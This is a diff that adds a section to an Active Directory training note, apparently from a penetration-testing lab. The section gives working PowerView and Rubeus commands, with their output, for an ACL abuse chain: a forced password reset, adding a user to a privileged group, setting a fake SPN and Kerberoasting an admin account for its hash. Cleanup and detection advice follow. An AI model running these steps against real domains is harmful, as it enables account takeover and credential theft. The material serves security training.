@@ -17,6 +17,21 @@
       - [Investigating ForceChangePassword Further](#investigating-forcechangepassword-further)
       - [Viewing Potential Attack Paths](#viewing-potential-attack-paths)
       - [Viewing Pre-Built Queries](#viewing-pre-built-queries)
+  - [ACL Abuse Tactics](#acl-abuse-tactics)
+    - [Abusing ACLs](#abusing-acls)
+      - [Creating a PSCredential Object](#creating-a-pscredential-object)
+      - [Creating a SecureString Object](#creating-a-securestring-object)
+      - [Changing a SecureString Object](#changing-a-securestring-object)
+      - [Creating a SecureString Object](#creating-a-securestring-object-1)
+      - [Adding a User to a Group](#adding-a-user-to-a-group)
+      - [Confirming the Added User](#confirming-the-added-user)
+      - [Creating a Fake SPN](#creating-a-fake-spn)
+      - [Kerberoasting with Rubeus](#kerberoasting-with-rubeus)
+    - [Cleanup](#cleanup)
+      - [Removing the Fake SPN](#removing-the-fake-spn)
+      - [Removing from a Group](#removing-from-a-group)
+      - [Confirming the Remove](#confirming-the-remove)
+    - [Detection and Remediation](#detection-and-remediation)
 
 
 # ACL Abuse
@@ -405,3 +420,221 @@ Finally, you can use the pre-built queries in BloodHound to confirm that the adu
 
 You've now enumerated these attack paths in multiple ways.
 
+## ACL Abuse Tactics
+
+### Abusing ACLs
+
+Following the prior example, to perform the attack chain, you have to do the following:
+
+1. Use the wley user to change the password for the damundsen user
+2. Authenticate as the damundsen user and leverage GenericWrite rights to add a user that you control to the Help Desk Level 1 group
+3. Take advantage of nested group membership in the Information Technology group and leverage GenericAll rights to take control of the adunn user
+
+So, first, you must authenticate as wley and force change the password of the user damundsen. You can start by opening a PowerShell console and authenticating as the wley user. Otherwise, you could skip this step if you were already running as this user. To do this, you can create a PSCredential object.
+
+#### Creating a PSCredential Object
+
+```powershell
+PS C:\htb> $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
+PS C:\htb> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword) 
+```
+
+#### Creating a SecureString Object
+
+Next, you must create a SecureString object which represents the password you want to set for the target user damundsen.
+
+```powershell
+PS C:\htb> $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+```
+
+#### Changing a SecureString Object
+
+Finally, you'll use the Set-DomainUserPassword PowerView function to change the user's password. You need to use the ```-Credential``` flag with the credential object you created for the wley user. It's best to alwyays specify the ```-Verbose``` flag to get feedback on the command completing as expected or as much information about errors as possible. You could do this from a Linux attack host using a tool such as pth-net, which is part of the [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit).
+
+```powershell
+PS C:\htb> cd C:\Tools\
+PS C:\htb> Import-Module .\PowerView.ps1
+PS C:\htb> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
+
+VERBOSE: [Get-PrincipalContext] Using alternate credentials
+VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'damundsen'
+VERBOSE: [Set-DomainUserPassword] Password for user 'damundsen' successfully reset
+```
+
+You can see that the command completed successfully, changing the password for the target user while using the credentials you specified for the wley user that you control. Next, you need to perform a similar process to authenticate as the damundsen user and add yourself to the Help Desk Level 1 group.
+
+#### Creating a SecureString Object
+
+```powershell
+PS C:\htb> $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+PS C:\htb> $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword) 
+```
+
+#### Adding a User to a Group
+
+Next, you can use the ```Add-DomainGroupMember``` function to add yourself to the target group. You can first confirm that your user is not a member of the target group.
+
+```powershell
+PS C:\htb> Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
+
+CN=Stella Blagg,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+CN=Marie Wright,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+CN=Jerrell Metzler,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+CN=Evelyn Mailloux,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+CN=Juanita Marrero,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+CN=Joseph Miller,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+CN=Wilma Funk,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+CN=Maxie Brooks,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+CN=Scott Pilcher,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+CN=Orval Wong,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+CN=David Werner,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+CN=Alicia Medlin,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+CN=Lynda Bryant,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+CN=Tyler Traver,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+CN=Maurice Duley,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+CN=William Struck,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+CN=Denis Rogers,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+CN=Billy Bonds,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+CN=Gladys Link,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+CN=Gladys Brooks,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+CN=Margaret Hanes,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+CN=Michael Hick,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+CN=Timothy Brown,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+CN=Nancy Johansen,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+CN=Valerie Mcqueen,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+CN=Dagmar Payne,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+
+PS C:\htb> Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
+
+VERBOSE: [Get-PrincipalContext] Using alternate credentials
+VERBOSE: [Add-DomainGroupMember] Adding member 'damundsen' to group 'Help Desk Level 1'
+```
+
+#### Confirming the Added User
+
+A quick check shows that your addition to the group was successful.
+
+```powershell
+PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
+
+MemberName
+----------
+busucher
+spergazed
+
+<SNIP>
+
+damundsen
+dpayne
+```
+
+At this point, you should be able to leverage your new group membership to take control over the adunn user. Now, since your imaginary client gave you permission, you can change the password for the damundsen user, but the adunn user is an admin account that cannot be interrupted. Since you have GenericAll rights over this account, you can perform a targeted Kerberoasting attack by modifying the account's servicePrincipalName attribute to create a fake SPN that you can then Kerberoast to ontain the TGS ticket and crack the hash offline.
+
+#### Creating a Fake SPN
+
+You must be authenticated as a member of the Information Technology group for this to be successful. Since you added damundsen to the Help Desk Level 1 group, you inherited rights via nested group membership. You can now use Set-DomainObject to create the fake SPN. You could use the tool [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast) to perform this same attack from a Linux host, and it will create a temporary SPN, retrieve the hash, and delete the temporary SPN all in one command.
+
+```powershell
+PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
+
+VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
+VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential
+VERBOSE: [Get-DomainSearcher] search base: LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
+VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
+VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
+(&(|(|(samAccountName=adunn)(name=adunn)(displayname=adunn))))
+VERBOSE: [Set-DomainObject] Setting 'serviceprincipalname' to 'notahacker/LEGIT' for object 'adunn'
+```
+
+#### Kerberoasting with Rubeus
+
+If this worked, you should be able to Kerberoast the user using any number of methods and obtain the hash for offline cracking.
+
+```powershell
+PS C:\htb> .\Rubeus.exe kerberoast /user:adunn /nowrap
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.2
+
+
+[*] Action: Kerberoasting
+
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+
+[*] Target User            : adunn
+[*] Target Domain          : INLANEFREIGHT.LOCAL
+[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=adunn)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
+
+[*] Total kerberoastable users : 1
+
+
+[*] SamAccountName         : adunn
+[*] DistinguishedName      : CN=Angela Dunn,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+[*] ServicePrincipalName   : notahacker/LEGIT
+[*] PwdLastSet             : 3/1/2022 11:29:08 AM
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash                   : $krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$notahacker/LEGIT@INLANEFREIGHT.LOCAL*$ <SNIP>
+```
+
+You have successfully obtained the hash.
+
+### Cleanup
+
+There are a few things you need to do:
+
+1. Remove the fake SPN you created on the adunn user
+2. Remove the damundsen user from the Help Desk Level 1 group
+3. Set the password for the damundsen user back to its original value or have your client set it / alert the user
+
+#### Removing the Fake SPN
+
+```powershell
+PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
+
+VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
+VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential
+VERBOSE: [Get-DomainSearcher] search base: LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
+VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
+VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
+(&(|(|(samAccountName=adunn)(name=adunn)(displayname=adunn))))
+VERBOSE: [Set-DomainObject] Clearing 'serviceprincipalname' for object 'adunn'
+```
+
+#### Removing from a Group
+
+```powershell
+PS C:\htb> Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
+
+VERBOSE: [Get-PrincipalContext] Using alternate credentials
+VERBOSE: [Remove-DomainGroupMember] Removing member 'damundsen' from group 'Help Desk Level 1'
+True
+```
+
+#### Confirming the Remove
+
+```powershell
+PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
+```
+
+### Detection and Remediation
+
+A few recommendations around ACLs include:
+
+1. Auditing for and removing dangerous ACLs
+
+Organizations should have regular AD audits performed but also train internal staff to run tools such as BloodHound and identify potentially dangerous ACLs that can be removed.
+
+2. Monitor group membership
+
+Visibility into important groups is paramount. All high-impact groups in the domain should be monitored to alert IT staff or changes that could be indicative of an ACL attack chain.
+
+3. Audit and monitor for ACL changes
+
+Enabling the [Advanced Security Audit Policy](https://docs.microsoft.com/en-us/archive/blogs/canitpro/step-by-step-enabling-advanced-security-audit-policy-via-ds-access) can help in detecting unwanted changes, especially Event ID 5136: "A directory service object was modified" which would indicate that the domain object was modified, which could be indicative of an ACL attack.
